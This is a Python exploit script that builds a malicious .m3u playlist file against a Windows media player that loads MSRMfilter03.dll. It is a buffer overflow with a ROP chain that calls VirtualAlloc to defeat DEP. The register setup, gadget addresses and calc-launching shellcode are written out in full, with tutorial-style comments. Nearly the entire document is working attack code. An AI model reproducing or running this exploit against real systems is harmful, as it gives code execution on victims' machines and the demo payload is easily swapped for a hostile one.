  
import sys
import struct
import os

crash_file = "exploit.m3u"
#100124EE   C3               RETN

#Message=       0x1005d060 : ptr to kernel32!virtualalloc (0x77472fb6) (MSRMfilter03.dll)

#---------------------------------------------------------[Structure]-#
# LPVOID WINAPI VirtualAlloc(         => PTR to VirtualAlloc          #
#   _In_opt_  LPVOID lpAddress,       => Return Address (Call to ESP) #
#   _In_      SIZE_T dwSize,          => dwSize (0x1)                 #
#   _In_      DWORD flAllocationType, => flAllocationType (0x1000)    #
#   _In_      DWORD flProtect         => flProtect (0x40)             #
# );                                                                  #
#---------------------------------------------------[Register Layout]-#
# Remember (1) the  stack  grows  downwards  so we  need to load the  #
# values into the registers in reverse order! (2) We are going to do  #
# some clever  trickery to  align our  return after  executing.  To   #
# acchieve this we will be filling EDI with a ROP-Nop and we will be  #
# skipping ESP leaving it intact.                                     #
#                                                                     #
# EAX 90909090 => Nop                                                 #
# ECX 00000040 => flProtect                                           #
# EDX 00001000 => flAllocationType                                    #
# EBX 00000001 => dwSize                                              #
# ESP ???????? => Leave as is                                         #
# EBP ???????? => Call to ESP (jmp, call, push,..)                    #
# ESI ???????? => PTR to VirtualAlloc - DWORD PTR of 0x1005d060       #
# EDI 10019C60 => ROP-Nop same as EIP                                 #
#---------------------------------------------------------------------#

EAX = "\x2d\xb8\x02\x10" # POP EAX # RETN 
EAX += "\x90\x90\x90\x90"

ECX = "\x40\xb4\x02\x10" # POP ECX | RETN
ECX += "\xFF\xFF\xFF\xFF" 
ECX += "\x7e\x1d\x03\x10" # INC ECX # AND EAX,8 # RETN
ECX += "\x7e\x1d\x03\x10" # INC ECX # AND EAX,8 # RETN
ECX += "\x87\xA4\x02\x10" # ADD ECX,ECX
ECX += "\x87\xA4\x02\x10" # ADD ECX,ECX
ECX += "\x87\xA4\x02\x10" # ADD ECX,ECX
ECX += "\x87\xA4\x02\x10" # ADD ECX,ECX
ECX += "\x87\xA4\x02\x10" # ADD ECX,ECX
ECX += "\x87\xA4\x02\x10" # ADD ECX,ECX

EDX = "\x3f\xfb\x03\x10" #MOV EDX,E58B0001 # POP EBP # RETN  
EDX += "\x41\x41\x41\x41" 
EDX += "\x1c\x3b\x01\x10" # POP EBX # RETN 
EDX += "\xFF\x0F\x75\x1A" 
EDX += "\x3e\x9f\x02\x10" # ADD EDX,EBX # POP EBX # RETN 10
EDX += "\xFF\xB9\x02\x10"
EDX += "\xFF\xB9\x02\x10"
EDX += "\xFF\xB9\x02\x10"
EDX += "\xFF\xB9\x02\x10"
EDX += "\xFF\xB9\x02\x10"
EDX += "\xFF\xB9\x02\x10"

EBX = "\x13\x38\x01\x10" # POP EBX # RETN 
EBX += "\xFF\xFF\xFF\xFF"
EBX += "\xd3\x19\x03\x10" # INC EBX # FPATAN # RETN 
EBX += "\xd3\x19\x03\x10" # INC EBX # FPATAN # RETN 

EBP = "\x0c\x4c\x04\x10" # POP EBP # RETN  
EBP += "\xF5\x71\x03\x10" #FFD4 CALL ESP

ESI = "\x2d\xb8\x02\x10" # POP EAX | RETN
ESI += "\x60\xd0\x05\x10" 
ESI += "\x59\x7f\x02\x10" # MOV EAX,DWORD PTR DS:[EAX] # RETN 
ESI += "\x8e\xbb\x05\x10" # PUSH EAX # ADD DWORD PTR SS:[EBP+5],ESI # PUSH 1 # POP EAX # POP ESI # RETN

EDI = "\x98\xa5\x02\x10" # POP EDI # RETN
EDI += "\xEE\x24\x01\x10"

junk ="\x90\x90\x90\x90"

PUSHAD = "\x20\x47\x01\x10" # PUSHAD # RETN

rop = junk
rop += EDI
rop += ECX 
rop += ESI
rop += EDX
rop += EBP
rop += EBX
rop += EAX 
rop += PUSHAD

nops = "\x90" * 16

calc = (
"\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64"
"\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B"
"\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20"
"\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07"
"\x57\x69\x6E\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74"
"\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7")

crash = "http://." + "A"*17416 + "\xEE\x24\x01\x10" + rop + nops + calc + "C"*(7572-len(rop)-len(nops) - len(calc))


makedafile = open(crash_file, "w")
makedafile.write(crash)
makedafile.close()